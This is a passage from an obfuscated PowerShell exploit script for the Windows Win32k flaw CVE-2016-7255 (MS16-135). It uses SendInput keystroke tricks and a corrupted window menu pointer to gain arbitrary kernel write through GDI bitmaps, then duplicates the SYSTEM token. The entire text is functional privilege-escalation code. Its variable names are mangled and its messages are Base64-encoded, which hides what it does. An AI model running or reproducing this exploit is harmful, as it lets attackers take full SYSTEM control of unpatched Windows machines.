			echo "[+] PowerShell Token: 0x$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f $(_/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ $(${__/====\___/\__/=}+${_/\/\_/\/=\_____/})))"
			${_____/\__/\____/=} = ${__/====\___/\__/=}+${_/\/\_/\/=\_____/}
			break
		}
		${__/====\___/\__/=} = $(_/=\_/=\_/=\_/==\_ -_/===\_/=====\_/\_ $(${__/====\___/\__/=}+${___/\/====\_/===\})) - ${/=\_/==\_/\/=\/\_} - [System.IntPtr]::Size
	}
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACEAXQAgAEQAdQBwAGwAaQBjAGEAdABpAG4AZwAgAFMAWQBTAFQARQBNACAAdABvAGsAZQBuACEACgA=')))
	_____/\____/\__/== -_/===\_/=====\_/\_ ${_____/\__/\____/=} -___/=\_/=====\/=\_ ${/=\_/\__/=====\/\}
}
function __/\/\/=\/\_______ {
	param([Int]${______/\_/=\/==\_/})
	${_/\/==\/=\_/\__/\} = New-Object KEYBDINPUT
	${_/\/==\/=\_/\__/\}.dwFlags = 0
	${_/\/==\/=\_/\__/\}.wVk = ${______/\_/=\/==\_/}
	${/======\/===\_/\/} = New-Object INPUT
	${/======\/===\_/\/}.itype = 1
	${/======\/===\_/\/}.U = ${_/\/==\/=\_/\__/\}
	${_/\/\_/=\/\/\/=\/} = [System.Runtime.InteropServices.Marshal]::SizeOf(${/======\/===\_/\/})
	${___/===\_/\_/=\_/} = [ms16135]::SendInput(1, ${/======\/===\_/\/}, ${_/\/\_/=\/\/\/=\/})
	if (${___/===\_/\_/=\_/} -eq 1) {
		$true
	} else {
		$false
	}
}
function ____/\/\/\/=\_/==\ {
	param([Int]${______/\_/=\/==\_/})
	${_/\/==\/=\_/\__/\} = New-Object KEYBDINPUT
	${_/\/==\/=\_/\__/\}.dwFlags = 2
	${_/\/==\/=\_/\__/\}.wVk = ${______/\_/=\/==\_/}
	${/======\/===\_/\/} = New-Object INPUT
	${/======\/===\_/\/}.itype = 1
	${/======\/===\_/\/}.U = ${_/\/==\/=\_/\__/\}
	${_/\/\_/=\/\/\/=\/} = [System.Runtime.InteropServices.Marshal]::SizeOf(${/======\/===\_/\/})
	${___/===\_/\_/=\_/} = [ms16135]::SendInput(1, ${/======\/===\_/\/}, ${_/\/\_/=\/\/\/=\/})
	if (${___/===\_/\_/=\_/} -eq 1) {
		$true
	} else {
		$false
	}
}
function _/=\_/\___/\/\_/=\ {
	${___/===\_/\_/=\_/} = __/\/\/=\/\_______ -______/\_/=\/==\_/ 0x12 
	${___/===\_/\_/=\_/} = __/\/\/=\/\_______ -______/\_/=\/==\_/ 0x10 
	${___/===\_/\_/=\_/} = __/\/\/=\/\_______ -______/\_/=\/==\_/ 0x1b 
	${___/===\_/\_/=\_/} = ____/\/\/\/=\_/==\ -______/\_/=\/==\_/ 0x1b   
	${___/===\_/\_/=\_/} = __/\/\/=\/\_______ -______/\_/=\/==\_/ 0x1b 
	${___/===\_/\_/=\_/} = ____/\/\/\/=\_/==\ -______/\_/=\/==\_/ 0x1b   
	${___/===\_/\_/=\_/} = ____/\/\/\/=\_/==\ -______/\_/=\/==\_/ 0x12   
	${___/===\_/\_/=\_/} = ____/\/\/\/=\_/==\ -______/\_/=\/==\_/ 0x10   
}
function ___/\/\_/\/==\/\/= {
	param([Int]${___/=\/\/\_/\/\/=\})
	${___/===\_/\_/=\_/} = __/\/\/=\/\_______ -______/\_/=\/==\_/ 0x12    
	${___/===\_/\_/=\_/} = __/\/\/=\/\_______ -______/\_/=\/==\_/ 0x10    
	for (${_/=\_/===\_/=\/==}=0;${_/=\_/===\_/=\/==} -lt ${___/=\/\/\_/\/\/=\};${_/=\_/===\_/=\/==}++) {
		${___/===\_/\_/=\_/} = __/\/\/=\/\_______ -______/\_/=\/==\_/ 0x9 
		${___/===\_/\_/=\_/} = ____/\/\/\/=\_/==\ -______/\_/=\/==\_/ 0x9   
	}
	${___/===\_/\_/=\_/} = ____/\/\/\/=\_/==\ -______/\_/=\/==\_/ 0x12      
	${___/===\_/\_/=\_/} = ____/\/\/\/=\_/==\ -______/\_/=\/==\_/ 0x10      
}
do {
	${/==\/\_/\/=\_/\_/} = _/\____/==\_______
	${_/=\/=\/\/\/\/\/\} = _/\____/==\_______
	if (${/==\/\_/\/=\_/\_/}.BitmapKernelObj -lt ${_/=\/=\/\/\/\/\/\}.BitmapKernelObj) {
		${__/\/\_/\/====\_/=} = ${/==\/\_/\/=\_/\_/}
		${_____/=\/=\_/===\_} = ${_/=\/=\/\/\/\/\/\}
	} else {
		${__/\/\_/\/====\_/=} = ${_/=\/=\/\/\/\/\/\}
		${_____/=\/=\_/===\_} = ${/==\/\_/\/=\_/\_/}
	}
	${____/===\_/\_/===} = ${_____/=\/=\_/===\_}.BitmapKernelObj - ${__/\/\_/\/====\_/=}.BitmapKernelObj
} while (${____/===\_/\_/===} -ne 0x2000)
echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABBAGQAagBhAGMAZQBuAHQAIABsAGEAcgBnAGUAIABzAGUAcwBzAGkAbwBuACAAcABvAG8AbAAgAGYAZQBuAGcAIABzAGgAdQBpAC4ALgA=')))
echo "[+] Worker  : $($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${__/\/\_/\/====\_/=}.BitmapKernelObj)"
echo "[+] Manager : $($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${_____/=\/=\_/===\_}.BitmapKernelObj)"
echo "[+] Distance: 0x$($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${____/===\_/\_/===})"
${__/==\____/======} = ${__/\/\_/\/====\_/=}.BitmapKernelObj + 63
function __/\/===\_/==\_/== {
	param([Int64]${_/===\_/=====\_/\_})
	${/==\_/\___/===\__} = New-Object ms16135
	${/=\___/=\/====\__} = ${/==\_/\___/===\__}.CustomClass($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwB2AGUALQAyADAAMQA2AC0ANwAyADUANQA='))))
	if (${/=\___/=\/====\__} -eq 0){
		break
	}
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbAD8AXQAgAEMAcgBlAGEAdABpAG4AZwAgAFcAaQBuAGQAbwB3ACAAbwBiAGoAZQBjAHQAcwA=')))
	${/==\/=\/\/\/\/\__} = [ms16135]::GetModuleHandleW([String]::Empty)
	${/==\_/\/\/==\_/\_} = [ms16135]::CreateWindowExW(0,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwB2AGUALQAyADAAMQA2AC0ANwAyADUANQA='))),[String]::Empty,0x10CF0000,0,0,360,360,[IntPtr]::Zero,[IntPtr]::Zero,${/==\/=\/\/\/\/\__},[IntPtr]::Zero)
	if (${/==\_/\/\/==\_/\_} -eq 0){
		break
	}
	${_/\_/===\______/=} = [ms16135]::CreateWindowExW(0,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwB2AGUALQAyADAAMQA2AC0ANwAyADUANQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwB2AGUALQAyADAAMQA2AC0ANwAyADUANQA='))),0x50CF0000,0,0,160,160,${/==\_/\/\/==\_/\_},[IntPtr]::Zero,${/==\/=\/\/\/\/\__},[IntPtr]::Zero)
	if (${_/\_/===\______/=} -eq 0){
		break
	}
	${_/===\_/=====\_/\_} = ${_/===\_/=====\_/\_} - 0x28
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AcgByAHUAcAB0AGkAbgBnACAAYwBoAGkAbABkACAAdwBpAG4AZABvAHcAIABzAHAAbQBlAG4AdQA=')))
	${___/===\_/\_/=\_/} = [ms16135]::SetWindowLongPtr(${_/\_/===\______/=},-12,[IntPtr]${_/===\_/=====\_/\_})
	${___/===\_/\_/=\_/} = [ms16135]::ShowWindow(${/==\_/\/\/==\_/\_},1)
	${__/=\/=\/\_/=\_/=} = [ms16135]::GetDesktopWindow()
	${___/===\_/\_/=\_/} = [ms16135]::SetParent(${_/\_/===\______/=},${__/=\/=\/\_/=\_/=})
	${___/===\_/\_/=\_/} = [ms16135]::SetForegroundWindow(${_/\_/===\______/=})
	___/\/\_/\/==\/\/= -___/=\/\/\_/\/\/=\ 4
	${___/===\_/\_/=\_/} = [ms16135]::SwitchToThisWindow(${_/\_/===\______/=},$true)
	_/=\_/\___/\/\_/=\
	function ____/=\_/=\/\_/=\_ {
		${____/\__/=\/==\_/} = [diagnostics.stopwatch]::StartNew()
		while (${____/\__/=\/==\_/}.ElapsedMilliseconds -lt 3000) {
			${_/=\/\/\/\_/\/=\_} = New-Object tagMSG
			if ($([ms16135]::GetMessage([ref]${_/=\/\/\/\_/\/=\_},[IntPtr]::Zero,0,0))) {
				${___/===\_/\_/=\_/} = [ms16135]::SetFocus(${/==\_/\/\/==\_/\_}) 
				for (${_/=\_/===\_/=\/==}=0;${_/=\_/===\_/=\/==}-lt20;${_/=\_/===\_/=\/==}++){_/=\_/\___/\/\_/=\}        
				${___/===\_/\_/=\_/} = [ms16135]::SetFocus(${_/\_/===\______/=})  
				for (${_/=\_/===\_/=\/==}=0;${_/=\_/===\_/=\/==}-lt20;${_/=\_/===\_/=\/==}++){_/=\_/\___/\/\_/=\}        
				${___/===\_/\_/=\_/} = [ms16135]::TranslateMessage([ref]${_/=\/\/\/\_/\/=\_})
				${___/===\_/\_/=\_/} = [ms16135]::DispatchMessage([ref]${_/=\/\/\/\_/\/=\_})
			}
		} ${____/\__/=\/==\_/}.Stop()
	}
	[IntPtr]${Global:/=\___/==\/==\/==} = [ms16135]::VirtualAlloc([System.IntPtr]::Zero, 0x2000, 0x3000, 0x40)
	do {
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABUAHIAeQBpAG4AZwAgAHQAbwAgAHQAcgBpAGcAZwBlAHIAIABhAHIAYgBpAHQAcgBhAHIAeQAgACcATwByACcALgAuAA==')))
		${/=\___/=\/===\__/} = [ms16135]::GetBitmapBits(${__/\/\_/\/====\_/=}.BitmapHandle,0x2000,${/=\___/==\/==\/==})
		____/=\_/=\/\_/=\_
		${_/=\_/=\__/\/=\_/} += 1
	} while (${/=\___/=\/===\__/} -ne 0x2000 -And ${_/=\_/=\__/\/=\_/} -lt 10)
	${___/===\_/\_/=\_/} = [ms16135]::DestroyWindow(${_/\_/===\______/=})
	${___/===\_/\_/=\_/} = [ms16135]::DestroyWindow(${/==\_/\/\/==\_/\_})
	${___/===\_/\_/=\_/} = [ms16135]::UnregisterClass($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwB2AGUALQAyADAAMQA2AC0ANwAyADUANQA='))),[IntPtr]::Zero)
	if (${_/=\_/=\__/\/=\_/} -eq 10) {
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACEAXQAgAEIAdQBnACAAZABpAGQAIABuAG8AdAAgAHQAcgBpAGcAZwBlAHIALAAgAHQAcgB5ACAAYQBnAGEAaQBuACAAbwByACAAcABhAHQAYwBoAGUAZAA/AAoA')))
		${Script:_/=\/=\_____/=\_/} = 1
	}
}
__/\/===\_/==\_/== -_/===\_/=====\_/\_ ${__/==\____/======}
if (${_/=\/=\_____/=\_/}) {
	Return
}
if (${___/===\/\/\/\_/\} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADEA')))) {
	${__/=\/\/\/\___/\/} = 0x400000770
} else {
	${__/=\/\/\/\___/\/} = 0x400000760
}
do {
	${/==\/=\_/\_/\/=\/} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${/=\___/==\/==\/==}.ToInt64() + ${_/=\_/=\__/\/=\_/})
	if (${/==\/=\_/\_/\/=\/} -eq ${__/=\/\/\/\___/\/}) {
		${_/\/\/==\_/==\/==} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${/=\___/==\/==\/==}.ToInt64() + ${_/=\_/=\__/\/=\_/} + 16)
		${_/\__/=\__/\/====} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${/=\___/==\/==\/==}.ToInt64() + ${_/=\_/=\__/\/=\_/} + 24)
		if (${_/\/\/==\_/==\/==} -eq ${_/\__/=\__/\/====}) {
			${________/\_/\_/\_} = ${_/=\_/=\__/\/=\_/} + 16
			Break
		}
	}
	${_/=\_/=\__/\/=\_/} += 8
} while (${_/=\_/=\__/\/=\_/} -lt 0x2000)
${__/\/\/\/\_____/\} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${/=\___/==\/==\/==}.ToInt64() + ${________/\_/\_/\_})
${_/=\__/===\_/=\__} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${/=\___/==\/==\/==}.ToInt64() + ${________/\_/\_/\_} + 8)
if (${_/=\__/===\_/=\__} -ne 0) {
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbAD8AXQAgAFMAdQBjAGMAZQBzAHMALAAgAHIAZQBhAGQAaQBuAGcAIABiAGUAeQBvAG4AZAAgAHcAbwByAGsAZQByACAAYgBpAHQAbQBhAHAAIABzAGkAegBlACEA')))
	echo "[+] Old manager bitmap pvScan0: $($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${_/=\__/===\_/=\__})"
} else {
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACEAXQAgAEIAdQBmAGYAZQByACAAYwBvAG4AdABhAGkAbgBzACAAaQBuAHYAYQBsAGkAZAAgAGQAYQB0AGEALAAgAHEAdQBpAHQAdABpAG4AZwAuAC4ACgA=')))
	Return
}
[System.Runtime.InteropServices.Marshal]::WriteInt64($(${/=\___/==\/==\/==}.ToInt64() + ${________/\_/\_/\_}),${__/\/\_/\/====\_/=}.BitmappvScan0)
[System.Runtime.InteropServices.Marshal]::WriteInt64($(${/=\___/==\/==\/==}.ToInt64() + ${________/\_/\_/\_} + 8),${__/\/\_/\/====\_/=}.BitmappvScan0)
${_/=\__/===\_/=\__} = [System.Runtime.InteropServices.Marshal]::ReadInt64(${/=\___/==\/==\/==}.ToInt64() + ${________/\_/\_/\_} + 8)
echo "[+] New manager bitmap pvScan0: $($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAB9AA=='))) -f ${_/=\__/===\_/=\__})"
${___/===\_/\_/=\_/} = [ms16135]::SetBitmapBits(${__/\/\_/\/====\_/=}.BitmapHandle,0x2000,${/=\___/==\/==\/==})
_/=\/==\/===\/=\_/ -_____/=\/=\_/===\_ ${_____/=\/=\_/===\_}.BitmapHandle -__/\/\_/\/====\_/= ${__/\/\_/\/====\_/=}.BitmapHandle
